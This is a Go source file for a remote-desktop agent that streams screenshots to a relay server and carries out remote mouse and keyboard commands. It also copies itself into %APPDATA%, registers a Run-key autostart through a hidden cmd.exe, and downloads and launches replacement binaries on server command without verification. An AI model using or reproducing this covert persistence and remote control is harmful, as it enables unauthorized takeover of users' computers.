package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"image/jpeg"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/gorilla/websocket"
	"github.com/kbinani/screenshot"
)

type InputMessage struct {
	Type    string  `json:"type"`    // "mouse_move", "mouse_down", "mouse_up", "mouse_scroll", "key_down", "key_up", "key_text", "select_display", "self_update"
	Display int     `json:"display"` // Selected display index (0, 1, ...)
	X       float64 `json:"x"`       // Normalized 0.0 to 1.0 within selected display
	Y       float64 `json:"y"`       // Normalized 0.0 to 1.0 within selected display
	Button  string  `json:"button"`  // "left", "right", "middle"
	DeltaY  int     `json:"deltaY"`  // Scroll delta
	Code    int     `json:"code"`    // VK Code
	Text    string  `json:"text"`    // Direct Unicode input
	URL     string  `json:"url"`     // Download URL for self_update
	Version string  `json:"version"` // Target version
}

type DisplayInfo struct {
	Index  int `json:"index"`
	Width  int `json:"width"`
	Height int `json:"height"`
}

var currentDisplayIndex = 0

// defaultServer can be overridden at compile time via:
// -ldflags "-X main.defaultServer=your-domain.com"
var defaultServer = "localhost:8080"

// agentVersion can be overridden at compile time via:
// -ldflags "-X main.agentVersion=v1.1.0"
var agentVersion = "v1.1.0"

func main() {
	// Nettoyage de l'ancien binaire .old après une éventuelle mise à jour précédente
	if currentExe, err := os.Executable(); err == nil {
		_ = os.Remove(currentExe + ".old")
	}

	serverAddr := flag.String("server", defaultServer, "Server domain or IP (e.g. your-server.domain.com:8080)")
	targetID := flag.String("id", "", "Custom Agent ID (defaults to hostname)")
	fps := flag.Int("fps", 20, "Target FPS for streaming (e.g. 15-30)")
	quality := flag.Int("quality", 50, "JPEG Quality (1-100)")
	flag.Parse()

	hostname, _ := os.Hostname()
	if *targetID == "" {
		*targetID = fmt.Sprintf("%s-%s", hostname, runtime.GOARCH)
	}

	// Detect whether to use wss or ws
	rawAddr := strings.TrimRight(strings.TrimSpace(*serverAddr), "\x00 \t\r\n/")
	scheme := "ws"
	if strings.HasPrefix(rawAddr, "https://") {
		scheme = "wss"
		rawAddr = strings.TrimPrefix(rawAddr, "https://")
	} else if strings.HasPrefix(rawAddr, "http://") {
		scheme = "ws"
		rawAddr = strings.TrimPrefix(rawAddr, "http://")
	} else if strings.Contains(rawAddr, ".") && !strings.HasPrefix(rawAddr, "127.") && !strings.HasPrefix(rawAddr, "192.168.") && !strings.HasPrefix(rawAddr, "10.") {
		// Public domain via Cloudflare
		scheme = "wss"
	}

	rawAddr = strings.TrimRight(rawAddr, "/")

	// Auto-configure startup in user registry (HKCU)
	setupStartup(rawAddr)

	log.Printf("[+] Demarrage agent ak-ses ID: %s (version: %s)", *targetID, agentVersion)
	log.Printf("[+] Connexion vers %s://%s/ws/agent", scheme, rawAddr)

	u := url.URL{
		Scheme:   scheme,
		Host:     rawAddr,
		Path:     "/ws/agent",
		RawQuery: fmt.Sprintf("id=%s&hostname=%s&os=%s&version=%s", url.QueryEscape(*targetID), url.QueryEscape(hostname), runtime.GOOS, url.QueryEscape(agentVersion)),
	}

	interrupt := make(chan os.Signal, 1)
	signal.Notify(interrupt, os.Interrupt)

	for {
		conn, _, err := websocket.DefaultDialer.Dial(u.String(), nil)
		if err != nil {
			log.Printf("[-] Echec connexion: %v. Nouvelle tentative dans 3s...", err)
			time.Sleep(3 * time.Second)
			continue
		}
		log.Println("[+] Connecte au serveur relais avec succes !")

		// Send display list to server immediately
		sendDisplays(conn)

		done := make(chan struct{})

		// Goroutine 1 : Ecoute des inputs clavier / souris / display switch / self_update venant du Dashboard
		go func() {
			defer close(done)
			for {
				_, message, err := conn.ReadMessage()
				if err != nil {
					log.Printf("[-] Connexion perdue (read): %v", err)
					return
				}

				var input InputMessage
				if err := json.Unmarshal(message, &input); err != nil {
					continue
				}

				if input.Type == "self_update" {
					log.Printf("[*] Ordre de mise a jour recu vers version %s (url: %s)", input.Version, input.URL)
					go performSelfUpdate(input.URL, scheme, rawAddr)
					continue
				}

				if input.Type == "select_display" {
					num := screenshot.NumActiveDisplays()
					if input.Display >= 0 && input.Display < num {
						currentDisplayIndex = input.Display
						log.Printf("[*] Bascule sur ecran: %d", currentDisplayIndex)
					}
					continue
				}

				handleInput(input)
			}
		}()

		// Goroutine 2 : Capture d'écran et streaming
		tickerInterval := time.Duration(1000/(*fps)) * time.Millisecond
		ticker := time.NewTicker(tickerInterval)
		buf := new(bytes.Buffer)
		jpegOpts := &jpeg.Options{Quality: *quality}

		active := true
		for active {
			select {
			case <-done:
				active = false
			case <-interrupt:
				log.Println("[*] Arrêt demandé...")
				conn.WriteMessage(websocket.CloseMessage, websocket.FormatCloseMessage(websocket.CloseNormalClosure, ""))
				conn.Close()
				return
			case <-ticker.C:
				n := screenshot.NumActiveDisplays()
				if n == 0 {
					continue
				}

				if currentDisplayIndex >= n {
					currentDisplayIndex = 0
				}

				bounds := screenshot.GetDisplayBounds(currentDisplayIndex)
				img, err := screenshot.CaptureRect(bounds)
				if err != nil {
					continue
				}

				buf.Reset()
				if err := jpeg.Encode(buf, img, jpegOpts); err != nil {
					continue
				}

				// Envoi de l'image compressée (Binary Message)
				if err := conn.WriteMessage(websocket.BinaryMessage, buf.Bytes()); err != nil {
					log.Printf("[-] Erreur d'envoi vidéo: %v", err)
					active = false
				}
			}
		}

		ticker.Stop()
		conn.Close()
		log.Println("[*] Reconnexion dans 2 secondes...")
		time.Sleep(2 * time.Second)
	}
}

func sendDisplays(conn *websocket.Conn) {
	num := screenshot.NumActiveDisplays()
	displays := make([]DisplayInfo, num)
	for i := 0; i < num; i++ {
		b := screenshot.GetDisplayBounds(i)
		displays[i] = DisplayInfo{
			Index:  i,
			Width:  b.Dx(),
			Height: b.Dy(),
		}
	}
	payload, _ := json.Marshal(map[string]interface{}{
		"type":     "displays",
		"displays": displays,
	})
	conn.WriteMessage(websocket.TextMessage, payload)
}

func setupStartup(serverHost string) {
	if runtime.GOOS != "windows" {
		return
	}
	exePath, err := os.Executable()
	if err != nil {
		return
	}

	// Target permanent location in %APPDATA%\ak-ses\agent.exe
	appData := os.Getenv("APPDATA")
	if appData == "" {
		return
	}
	destDir := filepath.Join(appData, "ak-ses")
	destPath := filepath.Join(destDir, "agent.exe")

	_ = os.MkdirAll(destDir, 0755)

	// If not running from %APPDATA%, copy self there
	if !strings.EqualFold(exePath, destPath) {
		input, err := os.ReadFile(exePath)
		if err == nil {
			_ = os.WriteFile(destPath, input, 0755)
		}
	}

	// Register in HKCU\Software\Microsoft\Windows\CurrentVersion\Run
	// No admin rights required
	cmd := fmt.Sprintf(`reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "ak-ses-agent" /t REG_SZ /d "\"%s\" -server %s" /f`, destPath, serverHost)
	_ = os.WriteFile(filepath.Join(destDir, "run.cmd"), []byte(cmd), 0644)
	syscall.NewLazyDLL("shell32.dll").NewProc("ShellExecuteW").Call(
		0,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("open"))),
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("cmd.exe"))),
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("/c " + cmd))),
		0,
		0, // SW_HIDE
	)
}

func handleInput(input InputMessage) {
	n := screenshot.NumActiveDisplays()
	if n == 0 {
		return
	}
	dispIdx := currentDisplayIndex
	if input.Display >= 0 && input.Display < n {
		dispIdx = input.Display
	}
	if dispIdx >= n {
		dispIdx = 0
	}

	bounds := screenshot.GetDisplayBounds(dispIdx)
	screenWidth := bounds.Dx()
	screenHeight := bounds.Dy()

	switch input.Type {
	case "mouse_move":
		absX := bounds.Min.X + int(input.X*float64(screenWidth))
		absY := bounds.Min.Y + int(input.Y*float64(screenHeight))
		MoveMouse(absX, absY)

	case "mouse_down":
		MouseButton(strings.ToLower(input.Button), true)

	case "mouse_up":
		MouseButton(strings.ToLower(input.Button), false)

	case "mouse_scroll":
		MouseScroll(input.DeltaY)

	case "key_down":
		if input.Code > 0 {
			KeyInput(uint16(input.Code), true)
		}

	case "key_up":
		if input.Code > 0 {
			KeyInput(uint16(input.Code), false)
		}

	case "key_text":
		for _, r := range input.Text {
			SendUnicodeChar(r)
		}
	}
}

func performSelfUpdate(targetURL, wsScheme, rawAddr string) {
	fullURL := targetURL
	if !strings.HasPrefix(fullURL, "http://") && !strings.HasPrefix(fullURL, "https://") {
		httpScheme := "http"
		if wsScheme == "wss" {
			httpScheme = "https"
		}
		if !strings.HasPrefix(fullURL, "/") {
			fullURL = "/" + fullURL
		}
		fullURL = fmt.Sprintf("%s://%s%s", httpScheme, rawAddr, fullURL)
	}

	log.Printf("[*] Telechargement de la mise a jour depuis: %s", fullURL)

	currentExe, err := os.Executable()
	if err != nil {
		log.Printf("[-] Impossible de determiner le chemin de l'executable: %v", err)
		return
	}
	if resolved, err := filepath.EvalSymlinks(currentExe); err == nil {
		currentExe = resolved
	}

	dir := filepath.Dir(currentExe)
	tmpExe := filepath.Join(dir, fmt.Sprintf("agent_upd_%d.tmp", time.Now().UnixNano()))
	oldExe := currentExe + ".old"

	client := &http.Client{Timeout: 90 * time.Second}
	resp, err := client.Get(fullURL)
	if err != nil {
		log.Printf("[-] Erreur de telechargement: %v", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		log.Printf("[-] Reponse HTTP invalide: %s", resp.Status)
		return
	}

	out, err := os.OpenFile(tmpExe, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0755)
	if err != nil {
		log.Printf("[-] Impossible de creer le fichier temporaire: %v", err)
		return
	}

	written, err := io.Copy(out, resp.Body)
	out.Close()
	if err != nil {
		_ = os.Remove(tmpExe)
		log.Printf("[-] Echec ecriture telechargement: %v", err)
		return
	}

	// Un binaire agent fait au minimum plusieurs centaines de Ko
	if written < 100000 {
		_ = os.Remove(tmpExe)
		log.Printf("[-] Fichier telecharge incomplet ou corrompu (%d octets)", written)
		return
	}

	// 1. Supprimer un ancien .old si present
	_ = os.Remove(oldExe)

	// 2. Renommer l'executable courant en .old (autorise sous Windows en cours d'execution)
	if err := os.Rename(currentExe, oldExe); err != nil {
		_ = os.Remove(tmpExe)
		log.Printf("[-] Echec renommage executable courant: %v", err)
		return
	}

	// 3. Deplacer le nouvel executable a l'emplacement definitif
	if err := os.Rename(tmpExe, currentExe); err != nil {
		// En cas d'erreur, tenter de restaurer l'original
		_ = os.Rename(oldExe, currentExe)
		_ = os.Remove(tmpExe)
		log.Printf("[-] Echec remplacement binaire: %v", err)
		return
	}

	log.Printf("[+] Mise a jour appliquee avec succes (%d octets)", written)

	// 4. Relancer le nouveau binaire en conservant STRICTEMENT tous les arguments d'origine (os.Args[1:])
	// Cela garantit la conservation des flags (-server, -id, -fps, -quality, etc.)
	args := os.Args[1:]
	cmd := exec.Command(currentExe, args...)
	cmd.Dir = dir

	if runtime.GOOS == "windows" {
		cmd.SysProcAttr = &syscall.SysProcAttr{
			CreationFlags: 0x00000008 | 0x08000000, // DETACHED_PROCESS | CREATE_NO_WINDOW
		}
	}

	if err := cmd.Start(); err != nil {
		log.Printf("[-] Erreur lancement nouveau processus: %v. Restauration de l'ancien binaire...", err)
		_ = os.Remove(currentExe)
		_ = os.Rename(oldExe, currentExe)
		return
	}

	log.Printf("[+] Nouveau processus agent lance (PID: %d) avec les memes parametres: %v", cmd.Process.Pid, args)
	log.Printf("[+] Arret propre du processus actuel.")
	os.Exit(0)
}
